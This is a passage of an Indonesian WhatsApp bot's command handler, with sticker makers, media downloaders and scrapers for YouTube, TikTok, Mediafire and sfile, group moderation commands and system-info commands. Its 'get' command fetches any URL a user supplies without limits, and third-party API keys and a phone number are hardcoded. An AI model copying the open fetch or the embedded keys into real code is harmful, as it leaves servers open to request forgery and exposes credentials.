}} catch (err) {
return m.reply(`Terjadi kesalahan: ${err.message}`);
}}  
m.reply(`${getFunction(q)}`);
}
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "✈️",key: m.key,}})
break

	
case 'smeme': {
    if (!users.registered) return reply(msg.daftar)
    if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
    let [atas, bawah] = text.split`|`
    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || ''
    if (!mime) return reply(`balas gambar dengan perintah\n\n${prefix + command} <${atas ? atas : 'teks atas'}>|<${bawah ? bawah : 'teks bawah'}>`)
    reply(global.msg.wait)
    if (!/image\/(jpe?g|png)/.test(mime)) return reply(`_*Mime ${mime} tidak didukung!*_`)
    let img = await q.download()
    let url = await uploadImage(img)
    let meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas ? atas : '')}/${encodeURIComponent(bawah ? bawah : '')}.png?background=${url}`
    DanadyaksaDev.sendImageAsSticker(m.chat, meme, qsticker, { packname: packname, author: author })

}
break 
case 'sticker': case 's': case 'stickergif': case 'sgif': {
 if (!users.registered) return reply(msg.daftar)
 if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
 if (!quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
reply(`Sedang Proses Permintaan...`)
let media = await quoted.download()
let encmedia = await DanadyaksaDev.sendImageAsSticker(from, media, qsticker, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await DanadyaksaDev.sendVideoAsSticker(from, media, qsticker, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
return reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break   	

case 'hd2': case 'remini2': {
const sharp = require('sharp');
async function upscaleImage(inputPath) {
try {
const tempFilePath = path.join(__dirname, `temp_image_${Date.now()}.jpg`);
fs.writeFileSync(tempFilePath, inputPath);
await sharp(inputPath)
.resize({ width: 1920, height: 1080, fit: 'inside', withoutEnlargement: false })
.sharpen()
.linear(1.2, -(128 * 1.2) + 128)
.modulate({ brightness: 0.98 })
.toFile(tempFilePath);
await DanadyaksaDev.sendMessage(m.chat, {image: fs.readFileSync(tempFilePath)})
fs.unlinkSync(tempFilePath);
} catch (error) {
console.error('Error processing image:', error);
}
}

const bufferImage = await m.quoted.download()
return upscaleImage(bufferImage)
}
break

case 'get': {
 if (!users.registered) return reply(msg.daftar)
 if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (!text) return m.reply(`awali *URL* dengan http:// atau https://`)
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "♻️",key: m.key,}})        
try {
const gt = await axios.get(text, {
headers: {
"Access-Control-Allow-Origin": "*",
"Referer": "https://www.google.com/",
"Referrer-Policy": "strict-origin-when-cross-origin",
"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
},
responseType: 'arraybuffer' });
const contentType = gt.headers['content-type'];
console.log(`Content-Type: ${contentType}`);
if (/json/i.test(contentType)) {
const jsonData = JSON.parse(Buffer.from(gt.data, 'binary').toString('utf8'));
return m.reply(JSON.stringify(jsonData, null, 2));
} else if (/text/i.test(contentType)) {
const textData = Buffer.from(gt.data, 'binary').toString('utf8');
return m.reply(textData);
} else if (text.includes('webp')) {
return DanadyaksaDev.imgToSticker(m.chat, text, m, { packname: "", author: "Hann Universe!!" })
} else if (/image/i.test(contentType)) { return DanadyaksaDev.sendMessage(m.chat, { image: { url: text }}, { quoted: m });
} else if (/video/i.test(contentType)) { return DanadyaksaDev.sendMessage(m.chat, { video: { url: text }}, { quoted: m });
} else if (/audio/i.test(contentType) || text.includes(".mp3")) {
return DanadyaksaDev.sendMessage(m.chat, { audio: { url: text }}, { quoted: m });
} else if (/application\/zip/i.test(contentType) || /application\/x-zip-compressed/i.test(contentType)) {
return DanadyaksaDev.sendFile(m.chat, text, '', text, m)			
} else if (/application\/pdf/i.test(contentType)) {
return DanadyaksaDev.sendFile(m.chat, text, '', text, m)
} else {
return m.reply(`MIME : ${contentType}\n\n${gt.data}`);
}
} catch (error) {
console.error(`Terjadi kesalahan: ${error}`);
return m.reply(`Terjadi kesalahan saat mengakses URL: ${error.message}`);
}}
await DanadyaksaDev.sendMessage(m.chat, { react: { text: "✈️",key: m.key,}})
break		


case 'brat': {
if (!users.registered) return reply(msg.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (!q) return reply(`Masukkan teks\n\nContoh: ${prefix + command} alok hamil`);
let rulz = `https://api.zenkey.my.id/api/maker/brat?text=${encodeURIComponent(q)}&apikey=zenkey`;
try {
const res = await axios.get(rulz, { responseType: 'arraybuffer' });
const buffer = Buffer.from(res.data, 'binary');
await DanadyaksaDev.sendImageAsSticker(m.chat, buffer, m, { packname: `${botname}`, author: `DanadyaksaDev` });
} catch (e) {
console.log(e);
await reply(`Sedang maintenance atau API error`);
    }
}
break;	

case "play": {
if (!users.registered) return reply(msg.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (!text) return reply(`*Example:* ${prefix + command} photograph`)
await reaction(m.chat, "⏳");
const yts = require('yt-search');
let search = await yts(text);
let telaso = search.all[0].url;
var response = await ytdl(telaso)
var puki = response.data.mp3
DanadyaksaDev.sendMessage(m.chat, { audio: { url: puki },
mimetype: "audio/mpeg",
fileName: "danadyaksa.mp3",
contextInfo: {
forwardingScore: 100,
isForwarded: true,
externalAdReply: {
showAdAttribution: true,
title: search.all[0].title,
sourceUrl: search.all[0].timestamp,
thumbnailUrl: search.all[0].thumbnail,
}}},{quoted:m})
uselimit(1)
}
break	

case 'play2': {
if (!users.registered) return reply(msg.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (!text) return reply(`Contoh: ${prefix + command} sephia`);
reply(msg.wait);
try {
const search = require("yt-search");
const { youtube } = require("btch-downloader");
const axios = require("axios");
async function getBuffer(url) {
const res = await axios({
method: 'get',
url,
responseType: 'arraybuffer'
});
return res.data;
}
const look = await search(text);
const convert = look.videos[0];
if (!convert) return reply('Audio Tidak Ditemukan');
if (convert.seconds >= 3600) {
return reply('Audio is longer than 1 hour!');
}
let audioUrl;
try {
audioUrl = await youtube(convert.url);
} catch (e) {
reply("Retrying...");
audioUrl = await youtube(convert.url);
}
const thumbBuffer = await getBuffer(convert.thumbnail);
await DanadyaksaDev.sendMessage(m.chat, {
document: {
url: audioUrl.mp3
},
mimetype: 'audio/mpeg',
fileName: `${convert.title}.mp3`,
jpegThumbnail: thumbBuffer,
caption: `🎵 *${convert.title}*\n📽 *Source*: ${convert.url}`
}, {
quoted: m
});
} catch (e) {
reply(`*Error:* ${e.message}`);
}
};
break; 
      
 

case 'tiktokvideo':
case 'ttvideo':
case 'tiktokvid':
case 'ttvid': {
if (!users.registered) return reply(msg.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
await reaction(m.chat, "🕒");
const api = require('btch-downloader')
if (!args[0]) return reply(`Masukan URL!\n\ncontoh:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`);
if (!args[0].match(/tiktok/gi)) return reply(`URL Yang Tuan Berikan *Salah!!!*`);
try {
let maximus = await api.ttdl(args[0]);
let caption = `乂 *T I K T O K  D O W N L O A D* 

• *ɴᴀᴍᴀ ᴠɪᴅᴇᴏs:* 
${maximus.title}

• *ɴᴀᴍᴀ ᴀᴜᴅɪᴏ:* 
${maximus.title_audio}

${global.namabot}`;
await DanadyaksaDev.sendMessage(m.chat, { video: { url: maximus.video[0] }, caption: caption })
await DanadyaksaDev.sendMessage(m.chat, { audio: { url: maximus.audio[0] }, mimetype: "audio/mpeg", ptt: true }, { quoted: m })
await uselimit(1)
      } catch (e) {
		console.log(e)
		reply(e)
	}
}
break

case 'gdrive': {
    if (!users.registered) return reply(msg.daftar)
		if (!args[0]) return reply(`Enter the Google Drive link`)
	reply(msg.wait)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await reply(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	DanadyaksaDev.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('Error: Check link or try another link') 
  }
}
uselimit(1)
break
case 'ttslide': case 'tiktokslide':{
if (!users.registered) return reply(msg.daftar)
if (!text.includes('tiktok.com')) return reply(`*Example :* .${command} hhttps://vt.tiktok.com/xxxxxxx/`)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
const { tiktok, tiktok2, dlv3, dlv4, dlv5 } = require('./lib/tiktoktop')
const hasil = await dlv5(text)
let leocap = `*RISSXD SLIDE DOWNLOADER*\n\n*TITLE* : ${hasil.title}\n\n *TANGGAL* : ${hasil.at}\n\n*LINK* : ${text}`

try {
reaction(m.chat, "⏳")//react error
for (let i = 0; i < hasil.data.length; i++) {
let image = hasil.data[i];
await DanadyaksaDev.sendMessage(m.sender, { image: { url: image.url }, caption: i === 0 ? `${leocap}` : '' }, { quoted: m });
if (isGroup) return reply(`FOTO SLIDE SUDAH DIKIRIM KE CHAT PRIBADI`)
reaction(m.chat, "✅")//react error
}
} catch (err) {
reaction(m.chat, "❎")//react error
}}
uselimit(1)
break

case 'mediafire': case 'mf': {
if (!users.registered) return reply(msg.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (!text.includes('mediafire.com')) return reply(`• *Example :* .${command} https://www.mediafire.com/file/xxxxxxx/`)

async function mf(url) {
    return new Promise(async (resolve, reject) => {
        try {
            const response = await require("undici").fetch(url);
            const data = await response.text();
            const $ = cheerio.load(data);
            
            let name = $('.dl-info > div > div.filename').text();
            let link = $('#downloadButton').attr('href');
          let det = $('ul.details').html().replace(/\s/g, "").replace(/<\/li><li>/g, '\n').replace(/<\/?li>|<\/?span>/g, '');
            let type = $('.dl-info > div > div.filetype').text();

        

            const hasil = {
                filename: name,
                filetype: type,
                link: link,
                detail: det
            };

            resolve(hasil);
        } catch (err) {
            console.error(err);
            reject(err);
        }
    });
}

const sendReaction = async reactionContent => {
  DanadyaksaDev.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

try {
let { filename, filetype, link, detail } = await mf(text)
let mfcap = `╭──── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ᴍғ ]* ──々\n`
mfcap += `│ =〆 ɴᴀᴍᴀ : ${filename}\n`
mfcap += `│ =〆 ᴛʏᴘᴇ : ${filetype}\n`
mfcap += `│ =〆 ᴅᴇᴛᴀɪʟ : ${detail}\n`
mfcap += `│ =〆 ᴜʀʟ : ${text}\n`
mfcap += `╰─々`

await DanadyaksaDev.sendMessage(m.chat, {document: {url:link}, mimetype: link, fileName: filename, caption: mfcap }, {quoted:m});
} catch (err) {
try {
sendReaction("⏳")
const akira = await fetchJson(`https://api.botwa.space/api/mediafire?url=${text}&apikey=90x5sFRa1Xlc`)
let { filename, filesize, uploadAt, link } = akira.result
let result = `╭──── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ᴍғ ]* ──々\n`
result += `│ =〆 ɴᴀᴍᴀ : ${filename}\n`
result += `│ =〆 sɪᴢᴇ : ${filesize}\n`
result += `│ =〆 ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : ${uploadAt}\n`
result += `│ =〆 ᴜʀʟ : ${text}\n`
result += `╰─々`
sendReaction("✅")
await DanadyaksaDev.sendMessage(m.chat, {document: {url:akira.result.link}, mimetype: akira.result.link, fileName: filename, caption: result}, {quoted:m});
} catch (err) {
 sendReaction("❌")
}}}
uselimit(1)
break
case 'sfiledl': case 'sfdl': {
if (!users.registered) return reply(msg.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`) 
if (!text.includes('https://sfile.mobi')) return reply(`• *Example :* .${command} https://sfile.mobi/xxxxxxx/`)

reply(msg.wait)
reaction(m.sender, "⏳")
/*
💥 *SFILE DOWNLOADER*

💨 Options:
- Search (Query) + Page
- Top Trending + Page
- Latest Upload + Page
- Download

🧑‍💻 Script Code by Daffa
*/

const sfile = {
    latest_uploads: async function(page = 1) {
        try {
            const res = await axios.get('https://sfile.mobi');
            const cookies = res.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
            const headers = {
                'cookie': cookies,
                'referer': 'https://sfile.mobi/uploads.php',
                'user-agent': 'Postify/1.0.0'
            };
            const uploads = await axios.get(`https://sfile.mobi/uploads.php?page=${page}`, { headers });
            const $ = cheerio.load(uploads.data);

            const data = $('.list').map((_, el) => ({
                title: $(el).find('a').text().trim(),
                link: $(el).find('a').attr('href'),
                size: $(el).find('small').text().match(/(\d+(?:\.\d+)?\s[KMGT]B)/)?.[1],
                uploadDate: $(el).find('small').text().match(/Uploaded:\s([\d\-a-zA-Z]+)/)?.[1]
            })).get().filter(item => item.title && item.link && item.size && item.uploadDate);

            return { creator: 'Daffa ~', status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'An error occurred while fetching the latest updates.' };
        }
    },

    top_trending: async function(page = 1) {
        try {
            const response = await axios.get('https://sfile.mobi');
            const cookies = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
            const headers = {
                'authority': 'sfile.mobi',
                'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.7',
                'cookie': cookies,
                'referer': `https://sfile.mobi/top.php?page=${page}`,
                'user-agent': 'Postify/1.0.0'
            };
            const top = await axios.get(`https://sfile.mobi/top.php?page=${page}`, { headers });
            const $ = cheerio.load(top.data);

            const data = $('.list').map((_, el) => {
                const title = $(el).find('a').text().trim();
                const link = $(el).find('a').attr('href');
                const [size, downloadInfo] = $(el).find('small').text().split(', Download: ').map(e => e.trim());
                const [downloadCount, uploadedDate] = downloadInfo ? downloadInfo.split(' Uploaded: ').map(e => e.trim()) : [undefined, undefined];

                return title && link && size && downloadCount && uploadedDate ? 
                    { title, link, size, downloadCount, uploadDate: uploadedDate } : null;
            }).get().filter(item => item);

            return { creator: 'Daffa ~', status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'An error occurred while fetching the top trending files.' };
        }
    },
    
    search: async function(query, page = 1) {
        try {
            const url = `https://sfile.mobi/search.php?q=${query}&page=${page}`;
            const response = await axios.get(url, {
                headers: {
                    'authority': 'sfile.mobi',
                    'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9,*/*;q=0.8',
                    'referer': url,
                    'user-agent': 'Postify/1.0.0'
                }
            });

            const $ = cheerio.load(response.data);
            
            const data = $('.list').map((_, el) => {
                const title = $(el).find('a').text().trim();
                const link = $(el).find('a').attr('href');
                const sizeMatch = $(el).text().match(/\(([^)]+)\)$/);
                const size = sizeMatch ? sizeMatch[1] : undefined;
                return title ? { title, link, size } : null;
            }).get();

            return { creator: 'Daffa ~', status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'An error occurred while fetching search results.' };
        }
    },
    
    download: async function(url) {
        const headers = {
            'referer': url,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-Agent': 'Postify/1.0.0',
        };

        try {
            const response = await axios.get(url, { headers });
            headers.Cookie = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');

            const [filename, mimetype, downloadLink] = [
                response.data.match(/<h1 class="intro">(.*?)<\/h1>/s)?.[1] || '',
                response.data.match(/<div class="list">.*? - (.*?)<\/div>/)?.[1] || '',
                response.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1]
            ];
            
            if (!downloadLink) return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Download link tidak ditemukan!' };

            headers.Referer = downloadLink;
            const final = await axios.get(downloadLink, { headers });

            const [directLink, key, filesize] = [
                final.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1],
                final.data.match(/&k='\+(.*?)';/)?.[1].replace(`'`, ''),
                final.data.match(/Download File \((.*?)\)/)?.[1]
            ];

            const result = directLink + (key ? `&k=${key}` : '');
            if (!result) return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Direct Link Download tidak ditemukan!' };

            const data = await this.convert(result, url);

            return { creator: 'Daffa ~', status: 'success', code: 200, data: { filename, filesize, mimetype, result: data } };
        } catch (error) {
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: error };
        }
    },

    convert: async function(url, directLink) {
        try {
            const init = await axios.get(url, {
                maxRedirects: 0,
                validateStatus: status => status >= 200 && status < 303,
                headers: {
                    'Referer': directLink,
                    'User-Agent': 'Postify/1.0.0'
                },
            });

            const cookies = init.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
            const redirect = init.headers.location;

            const final_result = await axios.get(redirect, {
                responseType: 'arraybuffer',
                headers: {
                    'referer': directLink,
                    'user-agent': 'Postify/1.0.0',
                    'cookie': cookies,
                },
            });

            const filename = final_result.headers['content-disposition']?.match(/filename=["']?([^"';]+)["']?/)?.[1] || 'Tidak diketahui';
            return {
                filename,
                mimeType: final_result.headers['content-type'],
                buffer: Buffer.from(final_result.data)
            };
        } catch (error) {
            throw error;
        }
    }
};

try {
let hasil = await sfile.download(text)
let { filename, filesize, mimetype } = hasil.data
let sfdl = hasil.data.result
let sfcap = `╭──── *[ ᴅᴏᴡɴʟᴏᴀᴅ - sғ ]* ──々\n`
sfcap += `│ =〆 ɴᴀᴍᴀ : ${filename}\n`
sfcap += `│ =〆 ᴛʏᴘᴇ : ${mimetype}\n`
sfcap += `│ =〆 ᴅᴇᴛᴀɪʟ : ${filesize}\n`
sfcap += `│ =〆 ᴜʀʟ : ${text}\n`
sfcap += `╰─々`

await DanadyaksaDev.sendMessage(m.chat, {document: sfdl.buffer, mimetype: sfdl.mimeType, fileName: sfdl.filename, caption: sfcap }, {quoted:m});
reaction(m.sender, "✅")
} catch (err) {
reaction(m.sender, "❌")
}uselimit(1)}
break

case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                reply(`${m.pushName} *Has Gone AFK*${text ? ': ' + text : ''}`)
}

            break
            
case "hidetag": {
if (!users.registered) return reply(msg.daftar)
if (!isGroup) return reply(msg.ingroup)
if (!isAdmins) return reply(msg.admin)
if (!m.quoted && !text) return m.reply('example : .hidetag teksnya/replyteks')
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
DanadyaksaDev.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break     

case 'delete': case 'del': {
 if (!users.registered) return reply(msg.daftar)
 if (m?.isGroup && !isAdmins && !groupOwner && isBotAdmins) return
 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
DanadyaksaDev.sendMessage(m.chat, { delete: key })
}
break

case 'antilall': {
if (!users.registered) return reply(msg.daftar) 
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLAll) return m.reply(`_Kan udah aktif sebelumnya_`)
antilinkall.push(m.chat)
fs.writeFileSync('./start/lib/database/antilinkall.json', JSON.stringify(antilinkall, null, 2))
m.reply('Sukses Mengaktifkan Antilinkall')
} else if (args[0] === "off") {
if (!isAntiLAll) return m.reply(`_Kan udah nonaktif sebelumnya_`)
let anu = antilinkall.indexOf(m.chat)
antilinkall.splice(anu, 1)
fs.writeFileSync('./start/lib/database/antilinkall.json', JSON.stringify(antilinkall, null, 2))
m.reply('Sukses Menonaktifkan Antilinkall')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break  
            
case 'script': case 'sc': {
let Rawwwwr = `Need Script? 50k(FREE UPDATE) 

*If you want to ask questions, please chat :*
> ${owner}

*Jika ingin Tahu Informasi Mengenai Bot Ini :*
> _https://whatsapp.com/channel/0029ValmecRIyPtJuLzFD02h_`
 DanadyaksaDev.relayMessage(m.chat, {
requestPaymentMessage: {
lcurrencyCodeIso4217: 'IDR',
amount1000: 20000 * 20000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: `${Rawwwwr}`,
contextInfo: {
mentionedJid: ['6287701725776' + '@s.whatsapp.net'],
externalAdReply: {
showAdAttribution: true
}
}
}
}
}
}, {})
}
break     

case 'ping': {
if (!users.registered) return reply(msg.daftar)
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
reply(respon)
            }
            break       
            
case 'os': {
const os = require('os')

function formatUptime(uptime) {
const detik = Math.floor(uptime % 60)
const menit = Math.floor((uptime / 60) % 60)
const jam = Math.floor((uptime / 3600) % 24)
return `${jam} jam, ${menit} menit, ${detik} detik`
}

function getVersions(callback) {
exec('node -v', (err, nodeVersion) => {
if (err) nodeVersion = '✖️'
exec('npm -v', (err, npmVersion) => {
if (err) npmVersion = '✖️'
exec('ffmpeg -version', (err, ffmpegVersion) => {
if (err) ffmpegVersion = '✖️'
exec('python --version || python3 --version || py --version', (err, pythonVersion) => {
if (err) pythonVersion = '✖️'
exec('pip --version || pip3 --version', (err, pipVersion) => {
if (err) pipVersion = '✖️'
exec('choco -v', (err, chocoVersion) => {
if (err) chocoVersion = '✖️'
callback({ nodeVersion, npmVersion, ffmpegVersion, pythonVersion, pipVersion, chocoVersion })
})
})
})
})
})
})
}

function getStorageInfo(callback) {
if (os.platform() === 'win32') {
exec('wmic logicaldisk get size,freespace,caption', (err, stdout) => {
if (err) return callback('✖️')
const lines = stdout.trim().split('\n').slice(1)
const infoPenyimpanan = lines.map(line => {
const [drive, free, total] = line.trim().split(/\s+/)
return `🖥️ ${drive}: ${(total / (1024 ** 3)).toFixed(2)} GB total, ${(free / (1024 ** 3)).toFixed(2)} GB bebas`
}).join('\n')
callback(infoPenyimpanan)
})
} else {
exec('df -h --output=source,size,avail,target', (err, stdout) => {
if (err) return callback('✖️')
const lines = stdout.trim().split('\n').slice(1)
const infoPenyimpanan = lines.map(line => {
const [device, total, free, mount] = line.trim().split(/\s+/)
return `🖥️ ${mount}: ${total} total, ${free} bebas di ${device}`
}).join('\n')
callback(infoPenyimpanan)
})
}
}

function getLinuxInfo(callback) {
exec('cat /etc/os-release', (err, osInfo) => {
if (err) osInfo = '✖️'
callback(osInfo.trim())
})
}

function getBatteryInfo(callback) {
if (os.platform() === 'linux' || os.platform() === 'darwin') {
exec('upower -i $(upower -e | grep BAT)', (err, batteryInfo) => {
if (err) return callback('✖️')
callback(batteryInfo)
})
} else if (os.platform() === 'win32') {
exec('WMIC Path Win32_Battery Get EstimatedChargeRemaining', (err, batteryInfo) => {
if (err) return callback('✖️')
callback(`🔋 ${batteryInfo.trim()}%`)
})
} else {
callback('✖️')
}
}

function getSystemInfo() {
return {
platform: os.platform(),
cpuArch: os.arch(),
cpus: os.cpus().length,
totalMemory: (os.totalmem() / (1024 ** 3)).toFixed(2) + ' GB',
freeMemory: (os.freemem() / (1024 ** 3)).toFixed(2) + ' GB',
uptime: formatUptime(os.uptime()),
osVersion: os.release(),
loadAverage: os.loadavg().map(load => load.toFixed(2)).join(', ')
}
}

const sistemInfo = await getSystemInfo()
getVersions((versi) => {
getBatteryInfo((statusBaterai) => {
getStorageInfo((infoPenyimpanan) => {
getLinuxInfo((infoLinux) => {
let txt = `> *📊 Informasi Sistem*\n\n`
txt += `- 🌐 *Platform*: _${sistemInfo.platform}_\n`
txt += `- 💻 *Arsitektur CPU*: ${sistemInfo.cpuArch}\n`
txt += `- 🧠 *Jumlah CPU*: ${sistemInfo.cpus}\n`
txt += `- 🗄️ *Memori Total*: ${sistemInfo.totalMemory}\n`
txt += `- 🗃️ *Memori Bebas*: ${sistemInfo.freeMemory}\n`
txt += `- ⏱️ *Waktu Aktif*: ${sistemInfo.uptime}\n`
txt += `- 📀 *Versi OS*: ${sistemInfo.osVersion}\n`
txt += `- 📊 *Rata-rata Beban (1, 5, 15 menit)*: ${sistemInfo.loadAverage}\n`
txt += `- 🔋 *Energi*: ${statusBaterai}\n\n`

txt += `> *💾 Penyimpanan*\n`
txt += `${infoPenyimpanan}\n\n`

txt += `> *🛠️ Versi Alat*\n\n`
txt += `- ☕ *Node.js*: ${versi.nodeVersion.trim()}\n`
txt += `- 📦 *NPM*: ${versi.npmVersion.trim()}\n`
txt += `- 🎥 *FFmpeg*: ${versi.ffmpegVersion.split('\n')[0]}\n`
txt += `- 🐍 *Python*: ${versi.pythonVersion.trim()}\n`
txt += `- 📦 *PIP*: ${versi.pipVersion.trim()}\n`
txt += `- 🍫 *Chocolatey*: ${versi.chocoVersion.trim()}\n\n`

if (os.platform() === 'linux') {
txt += `> *🐧 Distribusi Linux*\n${infoLinux}\n`
}

m.reply(txt)
})
})
})
})
}
break                  
            
case 'yts': case 'ytsearch': {
if (!users.registered) return reply(msg.daftar)
if (users.limit < 1 ) return reply(`[ ! ] LIMITMU KURANG DARI 1`)
if (!text) return reply(`Example : ${prefix + command} story wa anime`)
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
}
DanadyaksaDev.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: qpayment })
            }
  uselimit(1)
            break
            
case 'pinterest': case 'pin': {
if (!users.registered) return reply(msg.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
  if (!text) return reply(`Enter Query`);
  //try {
  await m.reply('𝙿𝚕𝚎𝚊𝚜𝚎 𝚆𝚊𝚒𝚝... ');

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: DanadyaksaDev.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let pus of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
